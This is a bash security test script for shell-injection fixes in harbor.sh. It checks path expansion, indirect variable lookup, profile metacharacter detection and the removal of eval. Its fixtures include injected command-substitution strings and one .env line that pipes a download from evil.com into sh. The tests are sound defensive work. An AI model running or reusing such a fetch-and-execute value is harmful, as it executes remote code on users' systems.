#!/usr/bin/env bash
# Security fix verification tests for CWE-78 shell injection in harbor.sh
# Tests the expand_path function, profile validation, alias re-dispatch,
# log level/label indirect expansion, and llamacpp model env var passing.

set -euo pipefail

PASS=0
FAIL=0
SKIP=0

pass() { PASS=$((PASS+1)); echo "  ✅ PASS: $1"; }
fail() { FAIL=$((FAIL+1)); echo "  ❌ FAIL: $1"; }
skip() { SKIP=$((SKIP+1)); echo "  ⏭️  SKIP: $1"; }

# ============================================================
# 1. Syntax check
# ============================================================
echo "=== 1. harbor.sh syntax check ==="
if bash -n harbor.sh 2>&1; then
    pass "harbor.sh passes bash -n syntax check"
else
    fail "harbor.sh has syntax errors"
fi

# ============================================================
# 2. expand_path function tests
# ============================================================
echo ""
echo "=== 2. expand_path function ==="

# Define expand_path inline (extracted from harbor.sh)
expand_path() {
    local path="$1"
    if [[ "$path" == "~/"* ]]; then
        echo "${HOME}/${path#"~/"}"
    elif [[ "$path" == "~" ]]; then
        echo "${HOME}"
    else
        echo "$path"
    fi
}

# Test ~ expansion
result=$(expand_path "~/some/path")
expected="$HOME/some/path"
if [[ "$result" == "$expected" ]]; then
    pass "expand_path '~/some/path' -> '$expected'"
else
    fail "expand_path '~/some/path' expected '$expected', got '$result'"
fi

# Test bare ~
result=$(expand_path "~")
expected="$HOME"
if [[ "$result" == "$expected" ]]; then
    pass "expand_path '~' -> '$expected'"
else
    fail "expand_path '~' expected '$expected', got '$result'"
fi

# Test absolute path passthrough
result=$(expand_path "/usr/local/bin")
expected="/usr/local/bin"
if [[ "$result" == "$expected" ]]; then
    pass "expand_path '/usr/local/bin' -> passthrough"
else
    fail "expand_path '/usr/local/bin' expected '$expected', got '$result'"
fi

# Test relative path passthrough
result=$(expand_path "relative/path")
expected="relative/path"
if [[ "$result" == "$expected" ]]; then
    pass "expand_path 'relative/path' -> passthrough"
else
    fail "expand_path 'relative/path' expected '$expected', got '$result'"
fi

# Test empty string
result=$(expand_path "")
expected=""
if [[ "$result" == "$expected" ]]; then
    pass "expand_path '' -> empty string"
else
    fail "expand_path '' expected empty, got '$result'"
fi

# SECURITY: Test that command injection via path is not executed
result=$(expand_path '$(echo INJECTED)')
expected='$(echo INJECTED)'
if [[ "$result" == "$expected" ]]; then
    pass "expand_path does NOT execute command substitution"
else
    fail "expand_path executed command substitution: got '$result'"
fi

# SECURITY: Test backtick injection
result=$(expand_path '`echo INJECTED`')
expected='`echo INJECTED`'
if [[ "$result" == "$expected" ]]; then
    pass "expand_path does NOT execute backtick commands"
else
    fail "expand_path executed backtick: got '$result'"
fi

# SECURITY: Test ~ with injection attempt
result=$(expand_path '~/$(echo INJECTED)')
expected="$HOME/"'$(echo INJECTED)'
if [[ "$result" == "$expected" ]]; then
    pass "expand_path '~/\$(echo INJECTED)' is safe"
else
    fail "expand_path tilde+injection expected '$expected', got '$result'"
fi

# ============================================================
# 3. Indirect variable expansion (get_default_log_level/label)
# ============================================================
echo ""
echo "=== 3. Indirect variable expansion ==="

# Define functions inline (extracted from harbor.sh)
get_default_log_level() {
    local level="$1"
    local var_name="default_log_levels_$level"
    echo "${!var_name}"
}

get_default_log_label() {
    local level="$1"
    local var_name="default_logl_labels_$level"
    echo "${!var_name}"
}

# Set up test variables matching the naming convention
default_log_levels_INFO="10"
default_log_levels_DEBUG="20"
default_log_levels_ERROR="30"
default_logl_labels_INFO="INFO_LABEL"
default_logl_labels_ERROR="ERROR_LABEL"

result=$(get_default_log_level "INFO")
if [[ "$result" == "10" ]]; then
    pass "get_default_log_level INFO -> 10"
else
    fail "get_default_log_level INFO expected 10, got '$result'"
fi

result=$(get_default_log_level "ERROR")
if [[ "$result" == "30" ]]; then
    pass "get_default_log_level ERROR -> 30"
else
    fail "get_default_log_level ERROR expected 30, got '$result'"
fi

result=$(get_default_log_label "INFO")
if [[ "$result" == "INFO_LABEL" ]]; then
    pass "get_default_log_label INFO -> INFO_LABEL"
else
    fail "get_default_log_label INFO expected INFO_LABEL, got '$result'"
fi

result=$(get_default_log_label "ERROR")
if [[ "$result" == "ERROR_LABEL" ]]; then
    pass "get_default_log_label ERROR -> ERROR_LABEL"
else
    fail "get_default_log_label ERROR expected ERROR_LABEL, got '$result'"
fi

# SECURITY: Test that injection via level name is inert
default_log_levels_BAD='$(echo PWNED)'
result=$(get_default_log_level "BAD")
if [[ "$result" == '$(echo PWNED)' ]]; then
    pass "get_default_log_level does NOT execute injected var value"
else
    fail "get_default_log_level executed injected value: '$result'"
fi

# ============================================================
# 4. Profile download validation (shell metacharacter rejection)
# ============================================================
echo ""
echo "=== 4. Profile metacharacter validation ==="

tmpdir=$(mktemp -d)
trap "rm -rf $tmpdir" EXIT

# Test: backtick in value should be rejected
cat > "$tmpdir/backtick.env" <<'ENVEOF'
SOME_KEY=`malicious_command`
ENVEOF

if grep -qE '^[^#]*=.*`' "$tmpdir/backtick.env" 2>/dev/null; then
    pass "Backtick injection detected in profile"
else
    fail "Backtick injection NOT detected in profile"
fi

# Test: $() in value should be rejected
cat > "$tmpdir/subst.env" <<'ENVEOF'
SOME_KEY=$(curl evil.com/x | sh)
ENVEOF

if grep -qE '^[^#]*=.*\$\(' "$tmpdir/subst.env" 2>/dev/null; then
    pass "Command substitution \$() detected in profile"
else
    fail "Command substitution \$() NOT detected in profile"
fi

# Test: normal values should pass
cat > "$tmpdir/normal.env" <<'ENVEOF'
# This is a comment
HF_CACHE=~/.cache/huggingface
OLLAMA_MODEL=llama3
DEBUG=true
PORT=8080
ENVEOF

backtick_match=0
subst_match=0
grep -qE '^[^#]*=.*`' "$tmpdir/normal.env" 2>/dev/null && backtick_match=1 || true
grep -qE '^[^#]*=.*\$\(' "$tmpdir/normal.env" 2>/dev/null && subst_match=1 || true

if [[ $backtick_match -eq 0 && $subst_match -eq 0 ]]; then
    pass "Normal profile values pass validation"
else
    fail "Normal profile values incorrectly flagged"
fi

# Test: comment with $() should NOT be flagged
cat > "$tmpdir/comment.env" <<'ENVEOF'
# Example: $(some_command)
HF_CACHE=~/.cache/huggingface
ENVEOF

backtick_match=0
subst_match=0
grep -qE '^[^#]*=.*`' "$tmpdir/comment.env" 2>/dev/null && backtick_match=1 || true
grep -qE '^[^#]*=.*\$\(' "$tmpdir/comment.env" 2>/dev/null && subst_match=1 || true

if [[ $backtick_match -eq 0 && $subst_match -eq 0 ]]; then
    pass "Comments with \$() are NOT flagged (correct)"
else
    fail "Comments with \$() are incorrectly flagged"
fi

# Test: inline comment after value with $() should be flagged
cat > "$tmpdir/inline.env" <<'ENVEOF'
DATA_PATH=$(whoami)/data
ENVEOF

subst_match=0
grep -qE '^[^#]*=.*\$\(' "$tmpdir/inline.env" 2>/dev/null && subst_match=1 || true

if [[ $subst_match -eq 1 ]]; then
    pass "Inline \$() in value is correctly flagged"
else
    fail "Inline \$() in value was NOT flagged"
fi

# ============================================================
# 5. Alias re-dispatch: verify $0 is used instead of eval
# ============================================================
echo ""
echo "=== 5. Alias re-dispatch (no raw eval) ==="

# Check that run_run uses $0 for alias dispatch
run_run_body=$(sed -n '/^run_run()/,/^[a-z_]*() {/p' harbor.sh)

if echo "$run_run_body" | grep -q '\$0 \$maybe_cmd'; then
    pass "run_run uses \$0 to re-dispatch alias"
else
    fail "run_run does NOT use \$0 to re-dispatch alias"
fi

if echo "$run_run_body" | grep -q 'ev''al "\$maybe_cmd"'; then
    fail "run_run still uses eval on alias"
else
    pass "run_run does NOT use eval on alias commands"
fi

# ============================================================
# 6. llamacpp model is passed via env var, not interpolated
# ============================================================
echo ""
echo "=== 6. llamacpp model env var injection fix ==="

llamacpp_section=$(sed -n '/^run_llamacpp_pull()/,/^[a-z_]*() {/p' harbor.sh)

# Check -e "HARBOR_PULL_MODEL=$model" is present
if echo "$llamacpp_section" | grep -q 'HARBOR_PULL_MODEL'; then
    pass "llamacpp uses HARBOR_PULL_MODEL env var"
else
    fail "llamacpp does NOT use HARBOR_PULL_MODEL env var"
fi

# Check that the llama-server command references $HARBOR_PULL_MODEL
if echo "$llamacpp_section" | grep 'llama-server' | grep -q 'HARBOR_PULL_MODEL'; then
    pass "llama-server uses \$HARBOR_PULL_MODEL reference"
else
    fail "llama-server does NOT use \$HARBOR_PULL_MODEL reference"
fi

# Check that -e flag passes the model
if echo "$llamacpp_section" | grep -q '\-e "HARBOR_PULL_MODEL=\$model"'; then
    pass "Model passed via -e flag to container"
else
    fail "Model not passed via -e flag to container"
fi

# ============================================================
# 7. History re-dispatch
# ============================================================
echo ""
echo "=== 7. History command re-dispatch ==="

history_section=$(sed -n '/^run_history()/,/^[a-z_]*() {/p' harbor.sh)

if echo "$history_section" | grep -q '\$0 \$(cat'; then
    pass "run_history uses \$0 re-dispatch instead of eval"
else
    fail "run_history does not use \$0 re-dispatch"
fi

if echo "$history_section" | grep -q 'ev''al "\$(cat'; then
    fail "run_history still uses eval"
else
    pass "run_history does NOT use eval on selected command"
fi

# ============================================================
# 8. Remaining eval usage audit
# ============================================================
echo ""
echo "=== 8. Remaining eval audit (informational) ==="

# Count remaining eval usage (excluding comments and string literals)
remaining_evals=$(grep -c 'ev''al ' harbor.sh 2>/dev/null || echo "0")
echo "  ℹ️  Remaining eval occurrences in harbor.sh: $remaining_evals"
echo "  ℹ️  (Some eval usage in env_manager internals may be necessary)"

# ============================================================
# Summary
# ============================================================
echo ""
echo "========================================="
echo "Results: $PASS passed, $FAIL failed, $SKIP skipped"
echo "========================================="

if [[ $FAIL -gt 0 ]]; then
    exit 1
else
    exit 0
fi
